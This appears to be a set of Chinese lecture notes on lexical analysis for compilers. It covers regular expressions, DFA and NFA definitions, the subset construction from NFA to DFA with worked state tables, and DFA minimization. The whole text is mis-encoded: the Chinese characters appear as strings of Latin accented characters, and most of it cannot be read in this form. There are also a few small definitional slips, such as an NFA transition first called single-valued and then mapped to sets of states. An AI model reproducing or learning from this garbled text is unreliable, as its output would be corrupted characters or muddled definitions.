â…¡ã€å•è¯ç¬¦å·çš„è¯†åˆ«ï¼šè¶…å‰æœç´¢ ä¸Šå›¾ä¸ºè¯æ³•åˆ†æå™¨ç»“æ„ï¼Œå½“è¯æ³•åˆ†æå™¨è°ƒç”¨é¢„å¤„ç†å­ç¨‹åºå¤„ç†å‡ºä¸€ä¸²è¾“å…¥å­—ç¬¦æ”¾è¿›æ‰«æç¼“å†²åŒºä¹‹åï¼Œåˆ†æå™¨å°±ä»æ­¤ç¼“å†²åŒºç§é€ä¸€è¯†åˆ«å•è¯ç¬¦å·ã€‚å½“ç¼“å†²åŒºé‡Œçš„å­—ç¬¦ä¸²è¢«å¤„ç†å®Œä¹‹åï¼Œå®ƒåˆè°ƒç”¨é¢„å¤„ç†ç¨‹åºè£…å…¥æ–°ä¸²ã€‚\n è¶…å‰æœç´¢çš„åŸå› \n åœ¨ç¨‹åºä¸­æœ‰ä¸€äº›å•è¯çš„è¯†åˆ«ç»å¸¸éœ€è¦å¤šè¯»å…¥ä¸€äº›å­—ç¬¦æ‰èƒ½çŸ¥é“å“ªäº›å­—ç¬¦ç»„æˆä¸€ä¸ªå•è¯   â…¢ã€çŠ¶æ€è½¬æ¢å›¾ çŠ¶æ€è½¬æ¢å›¾æ˜¯ä¸€å¼ æœ‰é™æ–¹å‘å›¾ï¼Œæ˜¯è®¾è®¡è¯æ³•åˆ†æå™¨çš„æœ‰æ•ˆå·¥å…·ã€‚\ngraph LR 0--å­—æ¯--\u003e1 1--å­—æ¯æˆ–æ•°å­—--\u003e1 1--å…¶ä»–--\u003e2[*] ä¸€ä¸ªçŠ¶æ€è½¬æ¢å›¾å¯ç”¨äºè¯†åˆ«ï¼ˆæˆ–æ¥å—ï¼‰ä¸€å®šçš„å­—ç¬¦ä¸²\n3.3 æ­£è§„è¡¨è¾¾å¼ä¸æœ‰é™è‡ªåŠ¨æœº 1.æ­£è§„å¼ä¸æ­£è§„é›† æ­£è§„å¼ä¹Ÿç§°æ­£åˆ™è¡¨è¾¾å¼ï¼ˆregular expressionï¼‰ï¼Œæ˜¯è¯´æ˜å•è¯çš„æ¨¡å¼ï¼ˆpatternï¼‰çš„ä¸€ç§é‡è¦çš„è¡¨ç¤ºæ³•ï¼Œæ˜¯å®šä¹‰æ­£è§„é›†çš„æ•°å­¦å·¥å…·\næ­£è§„å¼åŠå…¶æ‰€è¡¨ç¤ºçš„æ­£è§„é›†çš„å®šä¹‰ï¼š è®¾å­—æ¯è¡¨ä¸ºâˆ‘ï¼Œè¾…åŠ©å­—æ¯è¡¨âˆ‘â€˜ = { Ï†ï¼ŒÎµï¼Œ |ï¼Œâ€¢ï¼Œ*ï¼Œï¼ˆï¼Œï¼‰}ï¼Œ\nâ‘  Îµ å’Œ Ï† éƒ½æ˜¯ âˆ‘ ä¸Šçš„æ­£è§„å¼ï¼Œä»–ä»¬æ‰€è¡¨ç¤ºçš„æ­£è§„é›†åˆ†åˆ«ä¸º { Îµ }å’Œ { } ï¼›\nâ‘¡ å¯¹ä»»ä½• a âˆˆ âˆ‘ ï¼Œa æ˜¯ âˆ‘ ä¸Šçš„ä¸€ä¸ªæ­£è§„å¼ï¼Œä»–æ‰€è¡¨ç¤ºçš„æ­£è§„é›†ä¸º { a } ï¼›\nâ‘¢ å‡å®š e1 å’Œ e2 éƒ½æ˜¯ âˆ‘ ä¸Šçš„æ­£è§„å¼ä»–ä»¬æ‰€è¡¨ç¤ºçš„æ­£è§„é›†åˆ†åˆ«ä¸º L(e1) å’Œ L(e2)ï¼Œé‚£ä¹ˆï¼Œ( e1 ) ï¼Œ e1 | e2 ï¼Œ e1 â€¢ e2 ï¼Œ e1* ä¹Ÿéƒ½æ˜¯æ­£è§„å¼ï¼Œä»–ä»¬æ‰€è¡¨ç¤ºçš„æ­£è§„é›†åˆ†åˆ«ä¸º L( e1 )ï¼Œ L( e1 ) âˆª L( e2 )ï¼Œ L( e1 ) L( e2 ) å’Œ ( L( e1 ) )* ï¼›\nâ‘£ä»…ç”±æœ‰é™æ¬¡ä½¿ç”¨ä¸Šè¿°ä¸‰æ­¥éª¤è€Œå®šä¹‰çš„è¡¨è¾¾å¼æ‰æ˜¯ âˆ‘ ä¸Šçš„æ­£è§„å¼ï¼Œä»…æœ‰è¿™äº›æ­£è§„å¼æ‰€è¡¨ç¤ºçš„é›†åˆæ‰æ˜¯ âˆ‘ ä¸Šçš„æ­£è§„é›†ã€‚\n æ³¨æ„ï¼Œ| ã€ â€¢ ã€* ã€å‡ä¸ºæ­£è§„å¼çš„è¿ç®—ç¬¦   | è¡¨ç¤ºæˆ–\nâ€¢ è¡¨ç¤ºè¿æ¥\n* è¡¨ç¤ºé—­åŒ…ï¼Œå³ä»»æ„æœ‰é™æ¬¡çš„è‡ªé‡å¤è¿æ¥\nåœ¨ä¸æ··æ·†çš„æƒ…å†µä¸‹ï¼Œæ‹¬å·å¯ä»¥çœå»ï¼Œä½†è§„å®šç®—ç¬¦çš„ä¼˜å…ˆé¡ºåºä¸º *ï¼Œ â€¢ ï¼Œ|ã€‚è¿æ¥ç¬¦ â€¢ ä¸€èˆ¬å¯çœç•¥ä¸å†™ï¼Œä¸‰ä¸ªç®—ç¬¦å‡ä¸ºå·¦ç»“åˆçš„ã€‚\n ä¾‹: a\t{a} a|b\t{a,b} ab\t{ab} (a|b)(a|b)\t{aa,ab,ba,bb} a*\t{Îµ,a,a,â€¦â€¦,ä»»æ„ä¸ªaçš„ä¸²} (a|b)*\t{Îµ,a,b,aa,ab,bb,â€¦â€¦,æ‰€æœ‰ç”±aå’Œbç»„æˆçš„ä¸²}  ç»“è®ºï¼šç¨‹åºè®¾è®¡è¯­è¨€çš„å•è¯éƒ½èƒ½ç”¨æ­£è§„å¼æ¥å®šä¹‰  æ­£è§„å¼çš„ç­‰ä»·æ€§ï¼šè‹¥ä¸¤ä¸ªæ­£è§„å¼ e1 å’Œ e2 æ‰€è¡¨ç¤ºçš„æ­£è§„é›†ç›¸åŒï¼Œåˆ™è¯´ e1 å’Œ e2 ç­‰ä»·ï¼Œå†™ä½œ e1 = e2 ã€‚\nä¾‹: e1 = (a|b) , e2 = (b|a) ,e1 == e2 e1 = b(ab)* , e2 = (ba)*b , e1 == e2 æ­£è§„å¼æœä»çš„è§„å¾‹æœ‰ï¼š\n æˆ–æœä»äº¤æ¢å¾‹ï¼šU|V = V|U æˆ–çš„å¯ç»“åˆå¾‹ï¼šU|(V|W) = (U|V)|W è¿æ¥çš„å¯ç»“åˆå¾‹ï¼š(UV)W = U(VW) åˆ†é…å¾‹ï¼šU(V|W) = UV | UWï¼Œ(V|W)U = VU | WU Îµæ˜¯è¿æ¥çš„æ’ç­‰å¾‹ï¼šÎµU = Uï¼ŒUÎµ = U ç´ é›¶ä¸€å¾‹ï¼šU|U = U æˆ–çš„æŠ½å–å¾‹ï¼š U* = Îµ|U|UU|...  2.ç¡®å®šæœ‰é™è‡ªåŠ¨æœº ç¡®å®šæœ‰é™è‡ªåŠ¨æœºï¼ˆæœ‰ç©·è‡ªåŠ¨æœºï¼‰ä½œä¸ºä¸€ç§è¯†åˆ«è£…ç½®ï¼Œèƒ½å‡†ç¡®åœ°è¯†åˆ«æ­£è§„é›†ï¼Œå³è¯†åˆ«æ­£è§„æ–‡æ³•æ‰€å®šä¹‰çš„è¯­è¨€å’Œæ­£è§„å¼æ‰€è¡¨ç¤ºçš„é›†åˆï¼Œå¼•å…¥æœ‰ç©·è‡ªåŠ¨æœºè¿™ä¸ªç†è®ºï¼Œæ­£æ˜¯ä¸ºè¯æ³•åˆ†æç¨‹åºçš„è‡ªåŠ¨æ„é€ å¯»æ‰¾ç‰¹æ®Šçš„æ–¹æ³•å’Œå·¥å…·\næœ‰ç©·è‡ªåŠ¨æœºåˆ†ä¸¤ç±»ï¼šç¡®å®šçš„æœ‰é™è‡ªåŠ¨æœºï¼ˆdeterministic Finite Automataï¼‰å’Œä¸ç¡®å®šçš„æœ‰é™è‡ªåŠ¨æœºï¼ˆNondeterministic Finite Automataï¼‰\ngraph LR RE(RE) RE --\u003e NFA(NFA) NFA --\u003e DFA(DFA) DFA --\u003e minDFA(minDFA) DFA DFAå®šä¹‰ï¼šä¸€ä¸ªç¡®å®šçš„æœ‰ç©·è‡ªåŠ¨æœºï¼ˆDFAï¼‰Mæ˜¯ä¸€ä¸ªäº”å…ƒç»„ï¼š M = ï¼ˆ S ï¼Œâˆ‘ ï¼ŒÎ´ ï¼Œs0 ï¼ŒF ï¼‰\n å…¶ä¸­ï¼š\n S æ˜¯ä¸€ä¸ªæœ‰ç©·é›†ï¼Œä»–çš„æ¯ä¸ªå…ƒç´ ç§°ä¸ºä¸€ä¸ªçŠ¶æ€ï¼› Î£ æ˜¯ä¸€ä¸ªæœ‰ç©·å­—æ¯è¡¨ï¼Œä»–çš„æ¯ä¸ªå…ƒç´ ç§°ä¸ºä¸€ä¸ªè¾“å…¥ç¬¦å·ï¼Œæ‰€ä»¥ä¹Ÿç§° Î£ ä¸ºè¾“å…¥ç¬¦å·è¡¨ Î´ æ˜¯è½¬æ¢å‡½æ•°ï¼Œå®åœ¨ S Ã— Î£ â†’ S ä¸Šçš„å•å€¼éƒ¨åˆ†æ˜ å°„ï¼Œå³ï¼Œå¦‚æœ Î´ï¼ˆsï¼Œaï¼‰= sâ€˜ ï¼Œ (s âˆˆ Sï¼Œs' âˆˆ S ) å°±æ„å‘³ç€ï¼Œå½“å‰çŠ¶æ€ä¸ºsï¼Œè¾“å…¥ç¬¦ä¸ºaæ—¶ï¼Œå°†è½¬æ¢è‡³ä¸‹ä¸€ä¸ªçŠ¶æ€sâ€™ï¼Œs'ç§°ä½œsçš„ä¸€ä¸ªåç»§çŠ¶æ€ s0 âˆˆ S æ˜¯å”¯ä¸€çš„ä¸€ä¸ªåˆæ€ F âŠ‚ S æ˜¯ä¸€ä¸ªç»ˆæ€é›†ï¼ˆå¯ç©ºï¼‰ï¼Œç»ˆæ€ä¹Ÿç§°å¯æ¥å—çŠ¶æ€æˆ–ç»“æŸçŠ¶æ€   DFAå¯ä»¥ç”¨ä¸€ä¸ªçŸ©é˜µè¡¨ç¤ºï¼Œè¯¥çŸ©é˜µçš„è¡Œè¡¨ç¤ºçŠ¶æ€ï¼Œåˆ—è¡¨ç¤ºè¾“å…¥å­—ç¬¦ï¼Œå³sè¡Œaåˆ—çš„çŸ©é˜µå…ƒç´ è¡¨ç¤º Î´ï¼ˆsï¼Œaï¼‰çš„å€¼ã€‚è¿™ä¸ªçŸ©é˜µç§°ä¸ºçŠ¶æ€è½¬æ¢çŸ©é˜µã€‚\nä¸€ä¸ªDFAä¹Ÿå¯ä»¥è¡¨ç¤ºä¸ºä¸€å¼ ç¡®å®šçš„çŠ¶æ€è½¬æ¢å›¾\n å‡å®šDFA Må«æœ‰ mä¸ªçŠ¶æ€å’Œ nä¸ªè¾“å…¥å­—ç¬¦ï¼Œé‚£ä¹ˆï¼Œè¿™ä¸ªå›¾å«æœ‰mä¸ªçŠ¶æ€ç»“ç‚¹ï¼Œæ¯ä¸ªç»“ç‚¹é¡¶å¤šæœ‰næ¡ç®­å¼§å°„å‡ºå’Œåˆ«çš„ç»“ç‚¹ç›¸è¿æ¥ï¼Œæ¯æ¡ç®­å¼§ç”¨Î£ä¸­çš„ä¸€ä¸ªä¸åŒè¾“å…¥å­—ç¬¦ä½œæ ‡è®°ï¼Œæ•´å¼ å›¾å«æœ‰å”¯ä¸€çš„ä¸€ä¸ªåˆæ€ç»“ç‚¹å’Œè‹¥å¹²ä¸ªï¼ˆå¯ä»¥æ˜¯0ä¸ªï¼‰ç»ˆæ€ç»“ç‚¹ã€‚\nä¸€èˆ¬æ¥è¯´ï¼Œåˆæ€èŠ‚ç‚¹æ—è¾¹æ ‡ä»¥ â‡’ ï¼›ç»ˆæ€èŠ‚ç‚¹ç”¨åŒåœˆè¡¨ç¤ºã€‚\n ä¾‹å¦‚ï¼š\n   çŠ¶æ€ a b     +S U V   U Q V   V U Q   -Q Q Q    å¦‚ä¸Šè¡¨ï¼Œå¯è¡¨ç¤º(a|b)*ï¼Œä¹Ÿå¯ç”»æˆå¦‚ä¸‹å›¾\nDFAçš„ç¡®å®šæ€§\n1.æ˜ å°„Î´ ï¼š S Ã— Î£ â†’ S æ˜¯ä¸€ä¸ªå•å€¼å‡½æ•°ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¯¹ä»»ä½•çŠ¶æ€sâˆˆSå’Œè¾“å…¥ç¬¦å· a âˆˆ Î£ ï¼Œfï¼ˆsï¼Œaï¼‰å”¯ä¸€åœ°ç¡®å®šäº†ä¸‹ä¸€çŠ¶æ€ã€‚ä»è½¬æ¢å›¾çš„è§’åº¦æ¥çœ‹ï¼Œå‡å®šå­—æ¯è¡¨ Î£ å«æœ‰nä¸ªè¾“å…¥å­—ç¬¦ï¼Œé‚£ä¹ˆï¼Œä»»ä½•ä¸€ä¸ªçŠ¶æ€ç»“æœ€å¤šåªæœ‰næ¡å¼§å°„å‡ºï¼Œè€Œä¸”æ¯æ¡å¼§ä»¥ä¸€ä¸ªä¸åŒçš„è¾“å…¥å­—ç¬¦æ ‡è®°ã€‚\nNFA NFAçš„å®šä¹‰ï¼šä¸€ä¸ªéç¡®å®šçš„æœ‰ç©·è‡ªåŠ¨æœºï¼ˆNFAï¼‰Mæ˜¯ä¸€ä¸ªäº”å…ƒç»„ï¼šM = ï¼ˆ S ï¼Œâˆ‘ ï¼ŒÎ´ ï¼ŒS0 ï¼ŒF ï¼‰\n å…¶ä¸­ï¼š\n S æ˜¯ä¸€ä¸ªæœ‰ç©·é›†ï¼Œä»–çš„æ¯ä¸ªå…ƒç´ ç§°ä¸ºä¸€ä¸ªçŠ¶æ€ï¼› Î£ æ˜¯ä¸€ä¸ªæœ‰ç©·å­—æ¯è¡¨ï¼Œä»–çš„æ¯ä¸ªå…ƒç´ ç§°ä¸ºä¸€ä¸ªè¾“å…¥ç¬¦å·ï¼Œæ‰€ä»¥ä¹Ÿç§° Î£ ä¸ºè¾“å…¥ç¬¦å·è¡¨ Î´ æ˜¯è½¬æ¢å‡½æ•°ï¼Œå®åœ¨ S Ã— Î£* â†’ S ä¸Šçš„å•å€¼éƒ¨åˆ†æ˜ å°„ï¼Œå³ï¼Œ Î´ï¼š S Ã— Î£* â†’ 2S è¡¨æ˜åœ¨æŸçŠ¶æ€ä¸‹å¯¹äºæŸè¾“å…¥ç¬¦å·å¯èƒ½æœ‰å¤šä¸ªåç»§çŠ¶æ€ S0 âŠ‚ S æ˜¯ä¸€ä¸ªéç©ºåˆæ€é›† F âŠ‚ S æ˜¯ä¸€ä¸ªç»ˆæ€é›†ï¼ˆå¯ç©ºï¼‰ï¼Œç»ˆæ€ä¹Ÿç§°å¯æ¥å—çŠ¶æ€æˆ–ç»“æŸçŠ¶æ€   å¦‚å›¾ï¼Œä¸ºä¸€ä¸ªNFA\nâˆ‘* ä¸Šçš„ç¬¦å·ä¸² t è¢« NFA M æ¥å—ä¹Ÿå¯ä»¥è¿™æ ·ç†è§£ï¼š\nå¯¹äºÎ£*ä¸­çš„ä»»ä½•ä¸€ä¸ªä¸²tï¼Œè‹¥å­˜åœ¨ä¸€æ¡ä»æŸä¸€åˆæ€ç»“åˆ°æŸä¸€ç»ˆæ€ç»“çš„é“è·¯ï¼Œä¸”è¿™æ¡é“è·¯ä¸Šæ‰€æœ‰å¼§çš„æ ‡è®°å­—ä¾åºè¿æ¥æˆçš„ä¸²(ä¸ç†é‡‡é‚£äº›æ ‡è®°ä¸ºÎµçš„å¼§)ç­‰äºtï¼Œåˆ™ç§°tå¯ä¸ºNFA Mæ‰€è¯†åˆ«(è¯»å‡ºæˆ–æ¥å—)ã€‚è‹¥Mçš„æŸäº›ç»“æ—¢æ˜¯åˆæ€ç»“åˆæ˜¯ç»ˆæ€ç»“ï¼Œæˆ–è€…å­˜åœ¨ä¸€æ¡ä»æŸä¸ªåˆæ€ç»“åˆ°æŸä¸ªç»ˆæ€ç»“çš„é“è·¯,å…¶ä¸Šæ‰€æœ‰å¼§çš„æ ‡è®°å‡ä¸ºÎµï¼Œé‚£ä¹ˆç©ºå­—å¯ä¸ºMæ‰€æ¥å—ã€‚\nNFA Mæ‰€èƒ½æ¥å—çš„ç¬¦å·ä¸²çš„å…¨ä½“è®°ä¸ºL(M)\nç»“è®ºï¼š Î£ ä¸Šä¸€ä¸ªç¬¦å·ä¸²é›† V âŠ‚ Î£* æ˜¯æ­£è§„çš„ï¼Œå½“ä¸”ä»…å½“å­˜åœ¨ä¸€ä¸ª Î£ ä¸Šçš„ä¸ç¡®å®šçš„æœ‰ç©·è‡ªåŠ¨æœºMï¼Œæ˜¯çš„ V = L(M)\nNFAæ„é€ æ–¹æ³•: Î£ä¸Šçš„å­—æ¯aæ˜¯æ­£è§„å¼,æ„é€ ç­‰ä»·çš„NFAä¸º ä¸€ä¸ªåˆæ€,ä¸€ä¸ªç»ˆæ€,ä¸­é—´æ ‡è®°Îµå¼§ æ­£è§„å¼Aå’ŒBè¿æ¥æ˜¯æ­£è§„å¼,æ„é€ ç­‰ä»·NFAä¸º åˆæ€æ˜¯Açš„åˆæ€,ç»ˆæ€æ˜¯Bçš„ç»ˆæ€,ä»Açš„ç»ˆæ€åˆ°Bçš„åˆæ€æ ‡è®°ä¸ºÎµå¼§ A|Bæ˜¯æ­£è§„å¼,æ„é€ ç­‰ä»·çš„NFAä¸º æ„é€ æ–°çš„åˆæ€å’Œç»ˆæ€,ä»åˆæ€å¼•Îµåˆ°Aå’ŒBçš„åˆæ€,ä»åˆ°Aåˆ°Bçš„ç»ˆæ€å¼•Îµåˆ°ç»ˆæ€ A*æ˜¯æ­£è§„å¼,æ„é€ çš„ç­‰ä»·NFAä¸º æ„é€ æ–°çš„åˆæ€å’Œç»ˆæ€ï¼Œä»åˆæ€å¼•Îµåˆ°ç»ˆæ€å’ŒAçš„åˆæ€,ä»Açš„ç»ˆæ€å¼•Îµåˆ°ç»ˆæ€å’ŒAçš„åˆæ€ NFAå’ŒDFAçš„ç­‰ä»·æ€§  DFAæ˜¯NFAçš„ç‰¹ä¾‹  å¯¹äºæ¯ä¸ªNFA Mï¼Œå­˜åœ¨ä¸€ä¸ªDFA Mâ€™ ï¼Œä½¿å¾—L( M ) =L( Mâ€™ )ã€‚å¯¹æ¯ä¸ªNFA Må­˜åœ¨ç€ä¸ä¹‹ç­‰ä»·çš„DFA Mâ€™ã€‚å³ï¼šå¯¹äºä»»ä½•ä¸¤ä¸ªæœ‰ç©·è‡ªåŠ¨æœºMå’ŒMâ€™ï¼Œå¦‚æœL( M )=L( Mâ€™ )ï¼Œåˆ™ç§°Mä¸Mâ€™æ˜¯ç­‰ä»·çš„ã€‚\næœ‰ä¸€ç§ç®—æ³•ï¼Œå°†NFAè½¬æ¢æˆæ¥å—åŒæ ·è¯­è¨€çš„DFAã€‚è¿™ç§ç®—æ³•ç§°ä¸ºå­é›†æ³•ã€‚\nä¸æŸä¸€NFAç­‰ä»·çš„DFAä¸å”¯ä¸€\nä»NFAçš„çŸ©é˜µè¡¨ç¤ºä¸­ï¼Œè¡¨é¡¹é€šå¸¸æ˜¯ä¸€çŠ¶æ€çš„é›†åˆï¼Œè€Œåœ¨DFAçš„çŸ©é˜µè¡¨ç¤ºä¸­ï¼Œè¡¨é¡¹æ˜¯ä¸€ä¸ªçŠ¶æ€ï¼ŒNFAåˆ°ç›¸åº”çš„DFAçš„æ„é€ çš„åŸºæœ¬æ€è·¯æ˜¯ï¼š\n DFAçš„æ¯ä¸€ä¸ªçŠ¶æ€å¯¹åº”NFAçš„ä¸€ç»„çŠ¶æ€ã€‚  DFAä½¿ç”¨ä»–çš„çŠ¶æ€å»è®°å½•åœ¨NFAè¯»å…¥çš„ä¸€ä¸ªè¾“å…¥ç¬¦å·åå¯èƒ½è¾¾åˆ°çš„æ‰€æœ‰çŠ¶æ€ã€‚\nNFAç¡®å®šåŒ–ç®—æ³•ï¼ˆ NFA â†’ DFA çš„è½¬æ¢ï¼‰ å‡è®¾NFA N = ï¼ˆ Kï¼Œ Î£ ï¼Œ f ï¼ŒK0ï¼ŒKt ï¼‰æŒ‰å¦‚ä¸‹åŠæ³•æ„é€ ä¸€ä¸ªDFA M=ï¼ˆ Sï¼Œ Ã¥ï¼ŒÎ´ï¼ŒS0 ï¼ŒStï¼‰ï¼Œä½¿å¾—L(M) = L(N) ï¼š\n  Mçš„çŠ¶æ€é›† S ç”± K çš„ä¸€äº›å­é›†ç»„æˆã€‚ç”¨ [ S1 ï¼ŒS2 ï¼Œâ€¦ï¼ŒSj ] è¡¨ç¤º S çš„å…ƒç´ ï¼Œå…¶ä¸­ S1 ï¼ŒS2 ï¼Œâ€¦ï¼ŒSj æ˜¯Kçš„çŠ¶æ€ã€‚å¹¶çº¦å®šï¼Œ çŠ¶æ€ S1 ï¼ŒS2 ï¼Œâ€¦ï¼ŒSj æ˜¯æŒ‰æŸç§è§„åˆ™æ’åˆ—çš„ï¼Œå³å¯¹äºå­é›†{S1 ï¼ŒS2 } = {S2 ï¼ŒS1 }æ¥è¯´ï¼ŒSçš„çŠ¶æ€å°±æ˜¯ [S1 ï¼ŒS2Â ]\n  Må’ŒNçš„è¾“å…¥å­—æ¯è¡¨æ˜¯ç›¸åŒçš„ï¼Œå³ Î£\n  è½¬æ¢å‡½æ•°æ˜¯è¿™æ ·å®šä¹‰çš„ï¼š Î´ï¼ˆ [ S1 ï¼ŒS2 ï¼Œâ€¦ï¼ŒSj ] ï¼Œa ï¼‰ = [ R1 ï¼ŒR2 ï¼Œâ€¦ï¼ŒRt ] ï¼Œå…¶ä¸­ { R1 ï¼ŒR2 ï¼Œâ€¦ï¼ŒRt } = Îµ-closureï¼ˆ moveï¼ˆ{S1 ï¼ŒS2 ï¼Œâ€¦ï¼ŒSj } ï¼Œ aï¼‰ ï¼‰\n  S0 = Îµ-closureï¼ˆ K0 ï¼‰ä¸º M çš„å¼€å§‹çŠ¶æ€\n  St = {Si ï¼ŒSk ï¼Œâ€¦ï¼ŒSe }ï¼Œ å…¶ä¸­ [ Si ï¼ŒSk ï¼Œâ€¦ï¼ŒSe ] âˆˆ S ä¸” {Si ï¼ŒSk ï¼Œâ€¦ï¼ŒSe } âˆ© Kt â‰  Ï†\n     çŠ¶æ€é›†åˆ I çš„ Îµ-é—­åŒ…ï¼Œè¡¨ç¤ºä¸ºÎµ-closure( I )ï¼Œå®šä¹‰ä¸ºä¸€çŠ¶æ€é›†ï¼Œæ˜¯çŠ¶æ€é›†Iä¸­çš„ä»»ä½•çŠ¶æ€Sç»ä»»æ„æ¡Îµå¼§è€Œèƒ½åˆ°è¾¾çš„çŠ¶æ€çš„é›†åˆã€‚\nçŠ¶æ€é›†åˆIçš„ä»»ä½•çŠ¶æ€Séƒ½å±äºÎµ-closure(I)\n  çŠ¶æ€é›†åˆ I çš„ Î± å¼§è½¬æ¢ï¼Œå®šä¹‰çŠ¶æ€é›†åˆ J è¡¨ç¤ºä¸º J = move(I,a) ï¼Œå…¶ä¸­Jæ˜¯æ‰€æœ‰é‚£äº›å¯ä»Iä¸­çš„æŸä¸€çŠ¶æ€ç»è¿‡ä¸€æ¡aå¼§è€Œåˆ°è¾¾çš„çŠ¶æ€çš„å…¨ä½“ã€‚\nIa = Îµ-closure( J ) = Îµ-closure( move( I , a ) )\n   å¦‚ä¹‹å‰NFAçš„ä¾‹å­ï¼š\nI={1}, Îµ-closure(I) = {1,2}ï¼› I={5}, Îµ-closure(I) = {5,6,2}ï¼› move( {1,2} , a ) = {5,3,4} Îµ-closure({5,3,4}) = {2,3,4,5,6,7,8}ï¼› æ„é€ NFA Nçš„çŠ¶æ€Kçš„å­é›†çš„ç®—æ³•ï¼š\nâ€‹\tå‡å®šæ‰€æ„é€ çš„å­é›†æ—ä¸ºCï¼Œå³ C = ï¼ˆT1 ï¼ŒT2 ï¼Œâ€¦ ï¼Œ TI ï¼‰ï¼Œå…¶ä¸­ T1 ï¼ŒT2 ï¼Œâ€¦ ï¼Œ TI ä¸ºçŠ¶æ€Kçš„å­é›†ã€‚\n1.å¼€å§‹ï¼Œä»¤Îµ-closure(K0)ä¸ºCä¸­çš„å”¯ä¸€æˆå‘˜ï¼Œå¹¶ä¸”ä»–æ˜¯æœªè¢«æ ‡è®°çš„ 2.while( Cä¸­å°šæœªè¢«æ ‡è®°çš„å­é›†T )do{ æ ‡è®°T; for æ¯ä¸ªè¾“å…¥å­—æ¯a do{ U := Îµ-closure( move(T, a) ); if U ä¸åœ¨ C ä¸­: å°†Uä½œä¸ºæœªæ ‡è®°çš„å­é›†TiåŠ åœ¨Cä¸­; } } ä¾‹ï¼š\nå¦‚ä¸Šå›¾ä¸ºå®ä¾‹NFAï¼Œæ„é€ å…¶çŠ¶æ€è½¬æ¢è¡¨\n   I Ia Ib     {iï¼Œ1ï¼Œ2} {1ï¼Œ2ï¼Œ3} {1ï¼Œ2ï¼Œ4}   {1ï¼Œ2ï¼Œ3} {1ï¼Œ2ï¼Œ3ï¼Œ5ï¼Œ6ï¼Œf} {1ï¼Œ2ï¼Œ4}   {1ï¼Œ2ï¼Œ4} {1ï¼Œ2ï¼Œ3} {1ï¼Œ2ï¼Œ4ï¼Œ5ï¼Œ6ï¼Œf}   {1ï¼Œ2ï¼Œ3ï¼Œ5ï¼Œ6ï¼Œf} {1ï¼Œ2ï¼Œ3ï¼Œ5ï¼Œ6ï¼Œf} {1ï¼Œ2ï¼Œ4ï¼Œ6ï¼Œf}   {1ï¼Œ2ï¼Œ4ï¼Œ5ï¼Œ6ï¼Œf} {1ï¼Œ2ï¼Œ3ï¼Œ6ï¼Œf} {1ï¼Œ2ï¼Œ4ï¼Œ5ï¼Œ6ï¼Œf}   {1ï¼Œ2ï¼Œ4ï¼Œ6ï¼Œf} {1ï¼Œ2ï¼Œ3ï¼Œ6ï¼Œf} {1ï¼Œ2ï¼Œ4ï¼Œ5ï¼Œ6ï¼Œf}   {1ï¼Œ2ï¼Œ3ï¼Œ6ï¼Œf} {1ï¼Œ2ï¼Œ3ï¼Œ5ï¼Œ6ï¼Œf} {1ï¼Œ2ï¼Œ4ï¼Œ6ï¼Œf}    å°†å…¶æ¯ä¸ªçŠ¶æ€ç¡®å®šåŒ–ï¼Œå³å¾—åˆ°å¦‚ä¸‹ç­‰ä»·DFA\nN\nçŠ¶æ€è½¬æ¢è¡¨å¦‚ä¸‹ï¼Œå°†ä¸€ç»„çŠ¶æ€æ›¿æ¢æˆå¯¹åº”ç¬¦å·ã€‚\n   I Ia Ib     S A B   A C B   B A D   C C E   D F D   E F D   F C E    minDFA è¯´ä¸€ä¸ªæœ‰ç©·è‡ªåŠ¨æœºæ˜¯åŒ–ç®€äº†çš„ï¼Œå³æ˜¯è¯´ï¼Œå®ƒæ²¡æœ‰å¤šä½™çŠ¶æ€å¹¶ä¸”å®ƒçš„çŠ¶æ€ä¸­æ²¡æœ‰ä¸¤ä¸ªæ˜¯äº’ç›¸ç­‰ä»·çš„ã€‚ä¸€ä¸ªæœ‰ç©·è‡ªåŠ¨æœºå¯ä»¥é€šè¿‡æ¶ˆé™¤å¤šä½™çŠ¶æ€å’Œåˆå¹¶ç­‰ä»·çŠ¶æ€è€Œè½¬æ¢æˆä¸€ä¸ªæœ€å°çš„ä¸ä¹‹ç­‰ä»·çš„æœ‰ç©·è‡ªåŠ¨æœºã€‚å³ç”¨ä¸€ä¸ªçŠ¶æ€ä»£æ›¿æ‰€æœ‰ä¸å…¶ç­‰ä»·çš„çŠ¶æ€ã€‚\næ‰€è°“æœ‰ç©·è‡ªåŠ¨æœºçš„å¤šä½™çŠ¶æ€ï¼Œæ˜¯æŒ‡è¿™æ ·çš„çŠ¶æ€ï¼šä»è‡ªåŠ¨æœºçš„å¼€å§‹çŠ¶æ€å‡ºå‘ï¼Œä»»ä½•è¾“å…¥ä¸²ä¹Ÿä¸èƒ½åˆ°è¾¾çš„é‚£ä¸ªçŠ¶æ€ï¼›æˆ–è€…ä»è¿™ä¸ªçŠ¶æ€æ²¡æœ‰é€šè·¯åˆ°è¾¾ç»ˆæ€ã€‚\n DFAçš„æœ€å°åŒ–å°±æ˜¯å¯»æ±‚æœ€å°çŠ¶æ€DFA  **æœ€å°çŠ¶æ€DFAçš„å«ä¹‰ï¼š**â‘ æ²¡æœ‰å¤šä½™çŠ¶æ€ï¼ˆæ­»çŠ¶æ€ï¼‰ï¼›â‘¡æ²¡æœ‰ä¸¤ä¸ªçŠ¶æ€æ—¶äº’ç›¸ç­‰ä»·çš„ï¼ˆä¸å¯åŒºåˆ«ï¼‰ã€‚\n ä¸¤ä¸ªçŠ¶æ€så’Œtå¯åŒºåˆ«ï¼šä¸æ»¡è¶³\n å…¼å®¹æ€§ï¼šåŒæ—¶ç»ˆæ€æˆ–åŒæ—¶éç»ˆæ€ ä¼ æ’­æ€§ï¼šä»så‡ºå‘è¯»å…¥æŸä¸ªaï¼ˆa âˆˆ Î£ ï¼‰å’Œä»tå‡ºå‘è¯»å…¥æŸä¸ªaåˆ°è¾¾çš„çŠ¶æ€ç­‰ä»·  ä¸¤ä¸ªçŠ¶æ€så’Œtç­‰ä»·ï¼š\n å¦‚æœç”± s å‡ºå‘èƒ½å¯¼å‡ºçš„æ‰€æœ‰ä¸²çš„é›†åˆä¸ t å‡ºå‘èƒ½å¯¼å‡ºçš„æ‰€æœ‰ä¸²çš„é›†åˆç›¸ç­‰ï¼Œæˆ‘ä»¬ç§°çŠ¶æ€ s ä¸çŠ¶æ€ t æ˜¯ç­‰ä»·çš„ã€‚   